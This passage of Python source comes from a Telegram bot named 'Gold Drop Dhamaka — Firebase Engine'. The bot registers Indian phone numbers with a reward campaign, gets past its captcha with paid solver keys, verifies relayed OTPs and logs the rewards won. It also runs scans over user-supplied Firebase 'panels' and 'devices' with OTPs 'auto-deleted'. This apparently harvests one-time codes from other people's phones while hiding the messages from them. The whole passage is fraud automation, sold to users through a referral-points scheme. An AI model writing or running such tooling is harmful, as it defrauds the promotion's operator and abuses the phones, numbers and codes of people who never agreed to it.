            r_reg = step_register(s, uk, dk, name, digits, email, PINCODE, img_payload, captcha_token=c_token)
            reg_status = r_reg.status_code if r_reg else -1
            reg_json = {}
            try:
                raw_resp = r_reg.json().get("resp", "")
                if raw_resp:
                    reg_json = json.loads(base64.b64decode(raw_resp).decode())
                else:
                    reg_json = r_reg.json()
            except Exception:
                pass

            reg_msg = str(reg_json.get("message") or reg_json.get("error") or "")
            inner_code = reg_json.get("statusCode", reg_status)
            is_fail = (
                reg_status not in (200, 201)
                or (isinstance(inner_code, int) and inner_code not in (200, 201))
                or any(bad in reg_msg.lower() for bad in ("already", "exist", "invalid", "error", "fail", "limit", "captcha", "expired", "blocked"))
            )
            if is_fail and not ("otp" in reg_msg.lower() and "sent" in reg_msg.lower()):
                bot.edit_message_text(
                    f"❌ <b>Registration Rejected:</b> +91{digits}\n<code>{reg_msg or f'HTTP {reg_status}'}</code>",
                    chat_id=message.chat.id, message_id=wait_m.message_id
                )
                return

            _manual_sessions[uid] = {
                "phone": digits,
                "session": s,
                "uk": uk,
                "dk": dk,
                "created_at": time.time()
            }
            user_states[uid] = "waiting_for_manual_otp"
            cancel_mk = types.InlineKeyboardMarkup()
            cancel_mk.add(types.InlineKeyboardButton("❌ Cancel Manual OTP", callback_data="cancel_manual"))
            bot.edit_message_text(
                f"✅ <b>OTP Sent to +91{digits}!</b>\n\n"
                f"Ab milne wala <b>4-6 digit OTP</b> seedha chat me send karein.",
                chat_id=message.chat.id, message_id=wait_m.message_id, reply_markup=cancel_mk
            )
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>Error:</b> +91{digits}\n<code>{e}</code>",
                chat_id=message.chat.id, message_id=wait_m.message_id
            )

    def verify_manual_otp_flow(message, raw_otp):
        uid = str(message.from_user.id)
        otp_clean = "".join(ch for ch in str(raw_otp or "") if ch.isdigit())
        if not (4 <= len(otp_clean) <= 6):
            bot.reply_to(
                message,
                "⚠️ <b>Invalid OTP!</b> 4 se 6 digit ka OTP bhejein.",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        sess_info = _manual_sessions.get(uid)
        if not sess_info:
            user_states[uid] = "waiting_for_manual_number"
            bot.reply_to(
                message,
                "⚠️ <b>Koi active manual number session nahi hai!</b>\nPehle 10-digit mobile number bhejein:",
                reply_markup=build_reply_keyboard(uid)
            )
            return

        phone = sess_info["phone"]
        s = sess_info["session"]
        uk = sess_info["uk"]
        dk = sess_info["dk"]

        wait_m = bot.reply_to(message, f"⏳ <b>+91{phone}</b> ke liye OTP <code>{otp_clean}</code> verify ho raha hai...")
        try:
            r_v = step_verify_otp(s, uk, dk, otp_clean)
            vres = {}
            try:
                raw_v = r_v.json().get("resp", "")
                if raw_v:
                    vres = json.loads(base64.b64decode(raw_v).decode())
                else:
                    vres = r_v.json()
            except Exception:
                pass

            v_code = vres.get("statusCode", r_v.status_code if r_v else -1)
            v_msg = str(vres.get("message") or "")
            is_verified = (
                (v_code == 200)
                or ("success" in v_msg.lower())
                or ("congrat" in v_msg.lower())
                or ("verif" in v_msg.lower())
                or ("reward" in vres)
                or ("win_type" in vres)
            )

            if not is_verified:
                save_processed(phone, f"manual_verify_failed: {v_msg[:30]}", otp=otp_clean, uid=uid)
                bot.edit_message_text(
                    f"❌ <b>Verify Failed:</b> +91{phone}\n🔑 OTP: <code>{otp_clean}</code>\n❌ Reason: <code>{v_msg or f'HTTP {v_code}'}</code>",
                    chat_id=message.chat.id, message_id=wait_m.message_id
                )
                return

            win = vres.get("win_type")
            if not isinstance(win, str):
                win = str(win or "")
            reward = vres.get("reward")
            is_no_win = (win.lower() in ("none", "")) and (reward in (None, "", "null", 0, "0"))

            deducted, rem_pts = deduct_point_on_otp_verified(uid)
            pts_note = f"\n💳 <b>Point Used:</b> -1 pt (Remaining: <b>{rem_pts} pts</b>)" if deducted else ""

            otp_ver_alert = (
                f"✅ <b>Manual OTP Verified!</b>\n\n"
                f"📱 <b>Phone:</b> <code>+91{phone}</code>\n"
                f"🔑 <b>OTP:</b> <code>{otp_clean}</code>\n"
                f"🎁 <b>Status:</b> {'No Reward' if is_no_win else f'{win} — {reward}'}\n"
                f"👤 <b>User ID:</b> <code>{uid}</code>\n\n"
                f"<i>Devloper by - @Harshitop_19</i>"
            )
            send_alert_bot(otp_ver_alert, chat_id=ALERT_CHAT_ID or uid)

            _manual_sessions.pop(uid, None)

            if is_no_win:
                save_processed(phone, "verified_no_reward", otp=otp_clean, win_type="none", uid=uid)
                bot.edit_message_text(
                    f"✅ <b>Verified:</b> <code>+91{phone}</code> (No Reward)\n🔑 <b>OTP:</b> <code>{otp_clean}</code>{pts_note}",
                    chat_id=message.chat.id, message_id=wait_m.message_id
                )
                return

            save_processed(phone, "success", reward=str(reward or ""), win_type=str(win or "Reward"), otp=otp_clean, uid=uid)
            win_alert = (
                f"🎉 <b>Manual Reward Won!</b> 🏆\n\n"
                f"📱 <b>Phone:</b> <code>+91{phone}</code>\n"
                f"🔑 <b>OTP:</b> <code>{otp_clean}</code>\n"
                f"🎁 <b>Win Type:</b> <b>{win}</b>\n"
                f"💰 <b>Reward:</b> <b>{reward}</b>\n\n"
                f"📄 <b>Raw JSON:</b>\n<pre>{json.dumps(vres, indent=2)[:1500]}</pre>\n\n"
                f"<i>Devloper by - @Harshitop_19</i>"
            )
            send_alert_bot(win_alert, chat_id=ALERT_CHAT_ID or uid)
            bot.edit_message_text(win_alert, chat_id=message.chat.id, message_id=wait_m.message_id)
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>Verify Error:</b> +91{phone}\n<code>{e}</code>",
                chat_id=message.chat.id, message_id=wait_m.message_id
            )

    def trigger_start_scan_ui(chat_id, uid, edit_msg_id=None):
        u_runner = get_user_runner(uid)
        if u_runner.is_running:
            notify_user(chat_id, "⚠️ Aapka scan already chal raha hai!", build_reply_keyboard(uid))
            return
        img = get_active_image_payload(uid=uid)
        if not img:
            notify_user(chat_id, "⚠️ <b>Image Missing:</b> Pehle chat me apni photo upload karein ya base64 paste karein.", build_reply_keyboard(uid))
            return
        ok_pts, cur_pts = has_sufficient_points(uid)
        if not ok_pts:
            notify_user(
                chat_id,
                f"⚠️ <b>Insufficient Points!</b>\n\n"
                f"Scan chalane ke liye kam se kam <b>1 Point</b> chahiye (1 OTP Verified = -1 Point).\n"
                f"💰 <b>Your Balance:</b> <b>{cur_pts} pts</b>\n"
                f"🎁 <b>'🎁 Refer & Earn'</b> se doston ko refer karke points earn karein!",
                build_reply_keyboard(uid)
            )
            return
        _, pending = panel_counts(uid)
        if pending == 0:
            notify_user(chat_id, "⚠️ Aapke paas koi pending Firebase nahi hai! Pehle Firebase links ya .txt file bhejein.", build_reply_keyboard(uid))
            return

        increment_user_scan(uid)
        stop_ev = threading.Event()
        _stop_events[int(uid)] = stop_ev

        threading.Thread(
            target=run_sequential_scan,
            args=(int(uid), stop_ev, notify_user),
            kwargs={"uid": str(uid)},
            daemon=True
        ).start()

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_live_status"))

        msg_txt = (
            f"🚀 <b>Sequential Scan Shuru Ho Gaya Hai!</b>\n\n"
            f"• Aapke Firebase panels aur devices sequence me process honge.\n"
            f"• OTP auto-delete hoga.\n"
            f"• Live updates ke liye keyboard me <b>'📡 Live Status'</b> dabayein."
        )
        if edit_msg_id:
            try:
                bot.edit_message_text(msg_txt, chat_id=chat_id, message_id=edit_msg_id, reply_markup=markup)
                return
            except Exception:
                pass
        notify_user(chat_id, msg_txt, markup)

    def trigger_stop_scan_ui(chat_id, uid, edit_msg_id=None):
        ev = _stop_events.get(int(uid))
        u_runner = get_user_runner(uid)
        stopped_any = False
        if ev:
            ev.set()
            stopped_any = True
        if u_runner.is_running:
            u_runner.current_step = "Stopping..."
            stopped_any = True
        msg_txt = (
            "🛑 <b>Stop signal send ho gaya hai.</b>\nCurrent running device ke baad scan ruk jayega."
            if stopped_any
            else "ℹ️ Aapka koi scan abhi active nahi hai."
        )
        if edit_msg_id:
            try:
                bot.edit_message_text(msg_txt, chat_id=chat_id, message_id=edit_msg_id)
                return
            except Exception:
                pass
        notify_user(chat_id, msg_txt, build_reply_keyboard(uid))

    def send_welcome_screen(chat_id, uid):
        total, pending = panel_counts(uid)
        img = get_active_image_payload(uid=uid)
        img_line = f"✅ Configured (~{img['size_kb']} KB)" if img else "⚠️ Not configured (Photo upload karein)"
        prof = get_user_profile(uid)
        pts = prof[7] if prof else 0

        welcome = (
            f"👋 <b>Gold Drop Dhamaka — Firebase Engine</b>\n\n"
            f"👤 <b>User ID:</b> <code>{uid}</code> (Data Isolated)\n"
            f"🏷 <b>Batch Code:</b> <code>{BATCH_CODE}</code>\n"
            f"📍 <b>Pincode:</b> <code>{PINCODE}</code>\n"
            f"🖼 <b>Your Image:</b> {img_line}\n"
            f"📋 <b>Your Panels:</b> {total} total ({pending} pending)\n"
            f"💰 <b>Your Refer Points:</b> <b>{pts} pts</b>\n\n"
            f"👉 <i>Neeche keyboard buttons se bot use karein:</i>\n\n"
            f"<i>Devloper by - @Harshitop_19</i>"
        )
        bot.send_message(chat_id, welcome, reply_markup=build_reply_keyboard(uid))

    @bot.message_handler(commands=["start", "menu"])
    def cmd_start(message):
        uid = str(message.from_user.id)
        uname = message.from_user.username or ""
        fname = message.from_user.first_name or ""

        parts = (message.text or "").split(maxsplit=1)
        ref_param = ""
        if len(parts) > 1:
            raw_arg = parts[1].strip()
            if raw_arg.startswith("ref_"):
                ref_param = raw_arg[4:].strip()
            elif raw_arg.isdigit():
                ref_param = raw_arg

        is_new, valid_ref = register_bot_user(uid, uname, fname, ref_by=ref_param)

        if not is_admin(uid) and is_user_banned(uid):
            bot.reply_to(message, "⛔ <b>Aapka access block/ban kiya gaya hai.</b>")
            return

        if is_new and valid_ref and is_refer_enabled():
            activate_referral_after_captcha(uid)
            bonus = get_refer_bonus()
            new_cnt, new_pts = credit_referral(valid_ref, bonus)
            disp_new = f"@{uname}" if uname else (fname or uid)
            notify_user(
                int(valid_ref),
                f"🎉 <b>New Referral Joined!</b>\n\n"
                f"👤 <b>User:</b> {disp_new} (<code>{uid}</code>)\n"
                f"💰 <b>Earned:</b> +{bonus} pts\n"
                f"📊 <b>Total Invites:</b> {new_cnt} | <b>Balance:</b> {new_pts} pts"
            )

        missing = get_missing_channels(uid)
        if missing:
            send_join_prompt(message.chat.id, missing)
            return

        send_welcome_screen(message.chat.id, uid)

    @bot.message_handler(commands=["refer"])
    def cmd_refer(message):
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        bot.send_message(message.chat.id, render_refer_text(uid), reply_markup=build_refer_keyboard(uid))

    @bot.message_handler(commands=["admin"])
    def cmd_admin(message):
        if not check_access(message):
            return
        uid = message.from_user.id
        if not is_admin(uid):
            bot.reply_to(message, "⛔ Yeh command sirf Admin ke liye hai.", reply_markup=build_reply_keyboard(uid))
            return
        bot.send_message(message.chat.id, render_admin_text(), reply_markup=build_admin_menu())

    @bot.message_handler(commands=["addkey"])
    def cmd_addkey(message):
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        text = message.text.replace("/addkey", "").strip()
        if not text:
            user_states[uid] = "waiting_for_keys"
            bot.reply_to(
                message,
                "🔑 <b>SolverCF Key Send Karein:</b>\n\nApni SolverCF API Key(s) yahan paste karein:\n"
                "🌐 <b>Website:</b> https://solvercf.com/dashboard\n"
                "💡 <i>Example:</i> <code>SCF_live_1234567890abcdef</code>",
                reply_markup=build_reply_keyboard(uid)
            )
            return
        added, total = add_captcha_keys(text, uid=uid)
        bot.reply_to(message, f"✅ <b>{added} Key(s) Added!</b>\nTotal Active Keys: <b>{total}</b>", reply_markup=build_captcha_keys_keyboard(0, uid=uid))

    @bot.message_handler(commands=["keys"])
    def cmd_keys(message):
        if not check_access(message):
            return
        all_k = load_captcha_keys(uid=uid)
        if not all_k:
            bot.reply_to(
                message,
                "⚠️ Koi SolverCF API key saved nahi hai.\n\n"
                "🌐 <b>SolverCF Link:</b> https://solvercf.com/dashboard\n"
                "💡 <i>Example:</i> <code>SCF_live_1234567890abcdef</code>",
                reply_markup=build_captcha_keys_keyboard(0, uid=uid)
            )
            return
        lines = [f"#{i+1}: <code>{k[:6]}...{k[-4:]}</code>" for i, k in enumerate(all_k)]
        text = "🔑 <b>Saved SolverCF Keys:</b>\n\n" + "\n".join(lines) + ""
        bot.reply_to(message, text, reply_markup=build_captcha_keys_keyboard(0, uid=uid))

    @bot.message_handler(commands=["help"])
    def cmd_help(message):
        if not check_access(message):
            return
        send_help_screen(message.chat.id, str(message.from_user.id))

    @bot.message_handler(commands=["addpanel"])
    def cmd_addpanel(message):
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        text = message.text or ""
        urls = extract_and_filter_firebase_urls(text)
        if not urls:
            bot.reply_to(message, "⚠️ Koi valid Firebase URLs nahi mile.\nUsage: <code>/addpanel &lt;url1&gt; &lt;url2&gt;</code>")
            return
        added = sum(1 for u in urls if add_panel(uid, u))
        total, pending = panel_counts(uid)
        bot.reply_to(
            message,
            f"✅ <b>Your Firebase Links Added!</b>\n\n"
            f"🔍 Found: {len(urls)}\n"
            f"➕ Added: {added}\n"
            f"📋 Your Total: {total} (Pending: {pending})",
            reply_markup=build_reply_keyboard(uid)
        )

    @bot.message_handler(commands=["stop"])
    def cmd_stop(message):
        if not check_access(message):
            return
        trigger_stop_scan_ui(message.chat.id, message.from_user.id)

    @bot.message_handler(commands=["status"])
    def cmd_status(message):
        if not check_access(message):
            return
        bot.send_message(message.chat.id, render_live_status_text(str(message.from_user.id)), reply_markup=build_reply_keyboard(str(message.from_user.id)))

    @bot.message_handler(content_types=["document"])
    def handle_document_upload(message):
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        try:
            doc = message.document
            fname = doc.file_name or "file.txt"
            wait_msg = bot.reply_to(message, f"⏳ <i>Processing document '{fname}'...</i>")

            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            content = downloaded.decode("utf-8", errors="ignore")

            urls = extract_and_filter_firebase_urls(content)
            if not urls:
                bot.edit_message_text(
                    f"❌ Document <b>{fname}</b> me koi valid Firebase URLs nahi mile.",
                    chat_id=message.chat.id,
                    message_id=wait_msg.message_id
                )
                return

            added = sum(1 for u in urls if add_panel(uid, u))
            total, pending = panel_counts(uid)

            res_text = (
                f"📁 <b>Document Successfully Processed!</b> 🎉\n\n"
                f"📄 <b>File:</b> <code>{fname}</code>\n"
                f"🔍 <b>Extracted URLs:</b> {len(urls)}\n"
                f"➕ <b>Newly Added to Your List:</b> {added}\n"
                f"⚠️ <b>Already Existed:</b> {len(urls) - added}\n"
                f"📋 <b>Your Pending Panels:</b> {pending}\n\n"
                f"👉 <i>Neeche keyboard se <b>'▶️ Start Scan'</b> dabayein!</i>"
            )
            bot.edit_message_text(res_text, chat_id=message.chat.id, message_id=wait_msg.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error processing file: <code>{e}</code>")

    @bot.message_handler(content_types=["photo"])
    def handle_photo_upload(message):
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        try:
            wait_msg = bot.reply_to(message, "⏳ <i>Aapki photo save aur Base64 me encode ho rahi hai...</i>")
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_bytes = bot.download_file(file_info.file_path)

            size_kb, _ = save_user_photo_bytes(downloaded_bytes, uid=uid)

            bot.edit_message_text(
                f"✅ <b>Aapki Photo Save Ho Gayi!</b> 🎉\n\n"
                f"• <b>User:</b> <code>{uid}</code> (Private / Isolated)\n"
                f"• <b>Size:</b> ~{size_kb} KB\n\n"
                f"Ab aapke scan me ye image automatically use hogi!",
                chat_id=message.chat.id,
                message_id=wait_msg.message_id
            )
        except Exception as e:
            bot.reply_to(message, f"❌ Error saving photo: <code>{e}</code>")

    @bot.message_handler(func=lambda msg: True)
    def handle_text_messages(message):
        global BATCH_CODE, PINCODE, OTP_TIMEOUT
        if not check_access(message):
            return
        uid = str(message.from_user.id)
        text = (message.text or "").strip()

        if text in ("❌ Cancel", "/cancel"):
            cancel_manual_flow(message.chat.id, uid)
            return

        known_kb_buttons = {
            "▶️ Start Scan", "🛑 Stop Scan", "➕ Add Firebase", "⚙️ Manage Firebases",
            "📡 Live Status", "🏆 Rewards / Stats", "🎁 Refer & Earn", "👤 My Profile",
            "🖼 Image / Photo", "📱 Recent Phones", "📱 Manual Number",
            "🔑 Captcha Keys", "🆘 Help", "👑 Admin Panel", "❌ Cancel"
        }

        state = user_states.get(uid)
        if state in ("waiting_for_manual_number", "waiting_for_manual_otp") and text in known_kb_buttons:
            user_states.pop(uid, None)
            state = None

        if state == "waiting_for_manual_number":
            user_states.pop(uid, None)
            start_manual_number_flow(message, text)
            return
        elif state == "waiting_for_manual_otp":
            verify_manual_otp_flow(message, text)
            return
        if state == "waiting_for_keys":
            user_states.pop(uid, None)
            added, total = add_captcha_keys(text, uid=uid)
            bot.reply_to(message, f"✅ <b>{added} Key(s) Added!</b>\nTotal Active Keys: <b>{total}</b>", reply_markup=build_captcha_keys_keyboard(0, uid=uid))
            return
        elif state == "waiting_for_image_url":
            user_states.pop(uid, None)
            url_match = re.search(r"https?://[^\s]+", text)
            if url_match:
                img_url = url_match.group(0)
                msg_wait = bot.reply_to(message, "⏳ Fetching image from URL...")
                ok = fetch_image_from_url(img_url, uid=uid)
                if ok:
                    bot.edit_message_text(f"✅ <b>Image Set Successfully from URL!</b>\n<code>{img_url}</code>", chat_id=message.chat.id, message_id=msg_wait.message_id)
                else:
                    bot.edit_message_text(f"❌ <b>Image Fetch Failed:</b> {img_url}", chat_id=message.chat.id, message_id=msg_wait.message_id)
                return
        elif state == "admin_add_channel" and is_admin(uid):
            user_states.pop(uid, None)
            parts = [p.strip() for p in text.split("|")]
            ch_input = parts[0]
            ch_title = parts[1] if len(parts) > 1 and parts[1] else ""
            ch_link = parts[2] if len(parts) > 2 and parts[2] else ""
            saved_id = add_required_channel(ch_input, title=ch_title, invite_link=ch_link)
            chat_status_note = ""
            try:
                ch_obj = bot.get_chat(saved_id)
                if not ch_title and getattr(ch_obj, "title", None):
                    ch_title = ch_obj.title
                    add_required_channel(saved_id, title=ch_title, invite_link=ch_link)
                chat_status_note = "\n✅ Channel reachable hai (bot ko channel me Admin zaroor banayein)."
            except Exception as ex_ch:
                chat_status_note = f"\n⚠️ Note: Bot abhi <code>{saved_id}</code> ko access nahi kar paaya ({ex_ch}). Channel me bot ko Admin banayein."
            bot.reply_to(
                message,
                f"✅ <b>Channel Added to Mandatory Join!</b>\n\n"
                f"🆔 <b>ID/Username:</b> <code>{saved_id}</code>\n"
                f"🏷 <b>Title:</b> {ch_title or saved_id}{chat_status_note}",
                reply_markup=build_channels_admin_keyboard()
            )
            return
        elif state == "admin_add_credit" and is_admin(uid):
            user_states.pop(uid, None)
            # Expected format: <user_id> <amount> (or separated by comma/pipe/space)
            tokens = [t for t in re.split(r"[\s,|]+", text.strip()) if t]
            if len(tokens) >= 2 and tokens[0].isdigit() and tokens[1].lstrip("-").isdigit() and int(tokens[1]) > 0:
                target_u = tokens[0]
                amt = int(tokens[1])
                new_bal = adjust_user_credits(target_u, amt)
                bot.reply_to(
                    message,
                    f"✅ <b>Credit Added!</b>\n\n👤 <b>User:</b> <code>{target_u}</code>\n➕ <b>Added:</b> +{amt} pts\n💰 <b>New Balance:</b> <b>{new_bal} pts</b>",
                    reply_markup=build_admin_menu()
                )
                notify_user(int(target_u), f"💳 <b>Admin Ne Aapke Account Me +{amt} Credit Add Kiye Hain!</b>\n💰 <b>Current Balance:</b> <b>{new_bal} pts</b>")
            else:
                bot.reply_to(message, "⚠️ Format galat hai. Bhejein: <code>&lt;user_id&gt; &lt;points&gt;</code>\nExample: <code>8083076438 50</code>", reply_markup=build_admin_menu())
            return
        elif state == "admin_deduct_credit" and is_admin(uid):
            user_states.pop(uid, None)
            tokens = [t for t in re.split(r"[\s,|]+", text.strip()) if t]
            if len(tokens) >= 2 and tokens[0].isdigit() and tokens[1].lstrip("-").isdigit() and int(tokens[1]) > 0:
                target_u = tokens[0]
                amt = int(tokens[1])
                new_bal = adjust_user_credits(target_u, -amt)
                bot.reply_to(
                    message,
                    f"✅ <b>Credit Deducted!</b>\n\n👤 <b>User:</b> <code>{target_u}</code>\n➖ <b>Deducted:</b> -{amt} pts\n💰 <b>Remaining Balance:</b> <b>{new_bal} pts</b>",
                    reply_markup=build_admin_menu()
                )
                notify_user(int(target_u), f"💸 <b>Admin Ne Aapke Account Se -{amt} Credit Deduct Kiye Hain.</b>\n💰 <b>Current Balance:</b> <b>{new_bal} pts</b>")
            else:
                bot.reply_to(message, "⚠️ Format galat hai. Bhejein: <code>&lt;user_id&gt; &lt;points&gt;</code>\nExample: <code>8083076438 20</code>", reply_markup=build_admin_menu())
            return
        elif state == "admin_set_refer_bonus" and is_admin(uid):
            user_states.pop(uid, None)
            if text.isdigit() and 0 <= int(text) <= 10000:
                set_setting("refer_bonus", int(text))
                bot.reply_to(message, f"✅ Per Refer Bonus updated to: <b>{int(text)} pts</b>", reply_markup=build_admin_menu())
            else:
                bot.reply_to(message, "⚠️ Valid number bhejein (0 - 10000).", reply_markup=build_admin_menu())
            return
        elif state == "admin_broadcast" and is_admin(uid):
            user_states.pop(uid, None)
            all_u = get_all_bot_users()
            sent = 0
            failed = 0
            for u_row in all_u:
                target_id = u_row[0]
                try:
                    bot.send_message(int(target_id), f"📢 <b>Admin Broadcast:</b>\n\n{text}", parse_mode="HTML", disable_web_page_preview=True)
                    sent += 1
                except Exception:
                    failed += 1
            bot.reply_to(message, f"📢 <b>Broadcast Complete!</b>\n✅ Sent: <b>{sent}</b> | ❌ Failed: <b>{failed}</b>", reply_markup=build_admin_menu())
            return
        elif state == "admin_ban_user" and is_admin(uid):
            user_states.pop(uid, None)
            target_uid = "".join(ch for ch in text if ch.isdigit())
            if target_uid:
                set_user_ban(target_uid, True)
                bot.reply_to(message, f"🚫 User <code>{target_uid}</code> ban kar diya gaya hai.", reply_markup=build_admin_menu())
            else:
                bot.reply_to(message, "⚠️ Valid numeric User ID bhejein.", reply_markup=build_admin_menu())
            return
        elif state == "admin_unban_user" and is_admin(uid):
            user_states.pop(uid, None)
            target_uid = "".join(ch for ch in text if ch.isdigit())
            if target_uid:
                set_user_ban(target_uid, False)
                bot.reply_to(message, f"✅ User <code>{target_uid}</code> unban kar diya gaya hai.", reply_markup=build_admin_menu())
            else:
                bot.reply_to(message, "⚠️ Valid numeric User ID bhejein.", reply_markup=build_admin_menu())
            return
        elif state == "admin_set_batch" and is_admin(uid):
            user_states.pop(uid, None)
            if text:
                BATCH_CODE = text
                set_setting("batch_code", BATCH_CODE)
                bot.reply_to(message, f"✅ Batch Code updated to: <code>{BATCH_CODE}</code>", reply_markup=build_admin_menu())
            return
        elif state == "admin_set_pincode" and is_admin(uid):
            user_states.pop(uid, None)
            clean_pin = "".join(ch for ch in text if ch.isdigit())
            if len(clean_pin) == 6:
                PINCODE = clean_pin
                set_setting("pincode", PINCODE)
                bot.reply_to(message, f"✅ Pincode updated to: <code>{PINCODE}</code>", reply_markup=build_admin_menu())
            else:
                bot.reply_to(message, "⚠️ 6-digit valid pincode bhejein.", reply_markup=build_admin_menu())
            return
        elif state == "admin_set_timeout" and is_admin(uid):
            user_states.pop(uid, None)
            if text.isdigit() and 10 <= int(text) <= 600:
                OTP_TIMEOUT = int(text)
                set_setting("otp_timeout", OTP_TIMEOUT)
                bot.reply_to(message, f"✅ OTP Timeout updated to: <code>{OTP_TIMEOUT}s</code>", reply_markup=build_admin_menu())
            else:
                bot.reply_to(message, "⚠️ 10 se 600 ke beech seconds me number bhejein.", reply_markup=build_admin_menu())
            return

        # Persistent Reply Keyboard button handlers
        if text == "❌ Cancel":
            cancel_manual_flow(message.chat.id, uid)
            return
        if text == "📱 Manual Number":
            user_states[uid] = "waiting_for_manual_number"
            c_mk = types.InlineKeyboardMarkup()
            c_mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_manual"))
            bot.send_message(
                message.chat.id,
                "📱 <b>Manual Number Enter Karein:</b>\n\nApna 10-digit Indian mobile number bhejein (OTP trigger hoga):",
                reply_markup=c_mk
            )
            return
        if text == "▶️ Start Scan":
            trigger_start_scan_ui(message.chat.id, uid)
            return
        elif text == "🛑 Stop Scan":
            trigger_stop_scan_ui(message.chat.id, uid)
            return
        elif text == "➕ Add Firebase":
            bot.send_message(
                message.chat.id,
                "➕ <b>Firebase Add Karein:</b>\n\nSingle link, bulk links ya <b>.txt file</b> chat me bhejein.",
                reply_markup=build_reply_keyboard(uid)
            )
            return
        elif text == "⚙️ Manage Firebases":
            all_p = get_all_panels(uid)
            if not all_p:
                bot.send_message(message.chat.id, "📋 Aapke abhi koi Firebase panels saved nahi hain.", reply_markup=build_reply_keyboard(uid))
            else:
                lines = [f"⚙️ <b>YOUR FIREBASES</b> (Total: {len(all_p)})"]
                for i, p in enumerate(all_p[:5], 1):
                    st_i = "✅ Done" if p.get("processed") else "⏳ Pending"
                    lines.append(f"<b>#{i}</b> [{st_i}] <code>{p['url']}</code>")
                lines.append("")
                bot.send_message(message.chat.id, "\n".join(lines), reply_markup=build_manage_keyboard(uid, 0))
            return
        elif text == "📡 Live Status":
            u_runner = get_user_runner(uid)
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_live_status"))
            bot.send_message(message.chat.id, render_live_status_text(uid), reply_markup=markup)
            return
        elif text == "🏆 Rewards / Stats":
            total_db, succ, rewards, ver_no = stats_summary(uid=uid)
            bot.send_message(
                message.chat.id,
                f"🏆 <b>YOUR SUMMARY STATS</b>\n─────────────────────────\n"
                f"🎁 <b>Your Rewards Won:</b> {rewards}\n"
                f"✅ <b>Your Verified (No Reward):</b> {ver_no}\n"
                f"📱 <b>Your Processed Numbers:</b> {total_db}",
                reply_markup=build_reply_keyboard(uid)
            )
            return
        elif text == "🎁 Refer & Earn":
            bot.send_message(message.chat.id, render_refer_text(uid), reply_markup=build_refer_keyboard(uid))
            return
        elif text == "👤 My Profile":
            prof = get_user_profile(uid)
            total_p, pending_p = panel_counts(uid)
            scans = prof[4] if prof else 0
            ref_by = prof[5] if (prof and prof[5]) else "Direct"
            refs = prof[6] if prof else 0
            pts = prof[7] if prof else 0
            bot.send_message(
                message.chat.id,
                f"👤 <b>MY PROFILE</b>\n"
                f"─────────────────────────\n"
                f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
                f"🤝 <b>Referred By:</b> <code>{ref_by}</code>\n"
                f"👥 <b>Your Total Referrals:</b> <b>{refs}</b>\n"
                f"💰 <b>Your Refer Points:</b> <b>{pts} pts</b>\n"
                f"🚀 <b>Your Scans Started:</b> <b>{scans}</b>\n"
                f"📋 <b>Your Saved Panels:</b> {total_p} ({pending_p} pending)",
                reply_markup=build_refer_keyboard(uid)
            )
            return
        elif text == "🖼 Image / Photo":
            img = get_active_image_payload(uid=uid)
            info = (f"✅ Configured (~{img['size_kb']} KB)" if img
                    else "⚠️ Not configured — Chat me photo upload karein ya base64 bhejein.")
            bot.send_message(message.chat.id, f"🖼 <b>Your Batch Image Status:</b>\n\n{info}", reply_markup=build_reply_keyboard(uid))
            return
        elif text == "📱 Recent Phones":
            rows = recent_phones(12, uid=uid)
            if not rows:
                bot.send_message(message.chat.id, "📱 Aapka abhi tak koi phone process nahi hua hai.", reply_markup=build_reply_keyboard(uid))
                return
            lines = ["📱 <b>YOUR RECENT PROCESSED NUMBERS</b>"]
            for p, st, rew, ts in rows:
                icon = "🏆" if st == "success" else ("✅" if st == "verified_no_reward" else "❌")
                r_txt = f" — 🎁 <b>{rew}</b>" if rew else ""
                lines.append(f"{icon} <code>+91{p}</code> ({st}){r_txt}")
            lines.append("")
            bot.send_message(message.chat.id, "\n".join(lines), reply_markup=build_reply_keyboard(uid))
            return
        elif text == "🔑 Captcha Keys":
            all_k = load_captcha_keys(uid=uid)
            lines = [f"#{i+1}: <code>{k[:6]}...{k[-4:]}</code>" for i, k in enumerate(all_k[:5])]
            body_k = "\n".join(lines) if lines else "⚠️ Koi key saved nahi hai."
            bot.send_message(
                message.chat.id,
                f"🔑 <b>SolverCF Keys ({len(all_k)})</b>\n\n{body_k}\n\n"
                "🌐 <b>Website:</b> https://solvercf.com/dashboard\n"
                "💡 <i>Example:</i> <code>SCF_live_1234567890abcdef</code>",
                reply_markup=build_captcha_keys_keyboard(0, uid=uid)
            )
            return
        elif text == "🆘 Help":
            send_help_screen(message.chat.id, uid)
            return
        elif text == "👑 Admin Panel":
            if is_admin(uid):
                bot.send_message(message.chat.id, render_admin_text(), reply_markup=build_admin_menu())
            else:
                bot.send_message(message.chat.id, "⛔ Yeh button sirf Admin ke liye hai.", reply_markup=build_reply_keyboard(uid))
            return

        if text.startswith("/9j/") or text.startswith("data:image/") or (len(text) > 300 and "firebase" not in text.lower()):
            try:
                size_kb, _ = save_user_base64_str(text, uid=uid)
                bot.reply_to(
                    message,
                    f"✅ <b>Aapki Base64 Image Save Ho Gayi!</b> (~{size_kb} KB)",
                    reply_markup=build_reply_keyboard(uid)
                )
                return
            except Exception:
                pass

        urls = extract_and_filter_firebase_urls(text)
        if urls:
            added = sum(1 for u in urls if add_panel(uid, u))
            total, pending = panel_counts(uid)
            bot.reply_to(
                message,
                f"✅ <b>Your Firebase Links Added!</b>\n\n"
                f"🔍 <b>Extracted:</b> {len(urls)} link(s)\n"
                f"➕ <b>Newly Added:</b> {added}\n"
                f"⚠️ <b>Duplicates / Skipped:</b> {len(urls) - added}\n"
                f"📋 <b>Your Pending:</b> {pending} of {total}\n\n"
